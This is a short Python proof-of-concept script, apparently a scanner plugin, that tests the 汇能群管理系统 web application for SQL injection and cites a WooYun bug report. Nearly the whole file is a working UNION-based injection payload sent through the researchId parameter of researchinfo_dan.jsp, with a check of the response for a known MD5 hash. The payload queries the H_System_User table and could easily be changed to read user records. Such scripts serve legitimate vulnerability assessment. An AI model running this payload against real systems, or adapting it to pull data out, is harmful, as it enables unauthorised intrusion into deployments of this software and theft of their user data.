#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇能群管理系统SQL注入
referer: http://wooyun.org/bugs/wooyun-2010-0152664
author: Lucifer
description: 链接/main/model/childcatalog/researchinfo_dan.jsp?researchId=1中 researchID未过滤存在SQL注入漏洞
'''
import sys
import requests
import warnings
def run(url):
        result = ['汇能群管理系统SQL注入','','']
        payload = "/main/model/childcatalog/researchinfo_dan.jsp?researchId=-1%20union%20select%201,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27)),3%20from%20H_System_User--"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
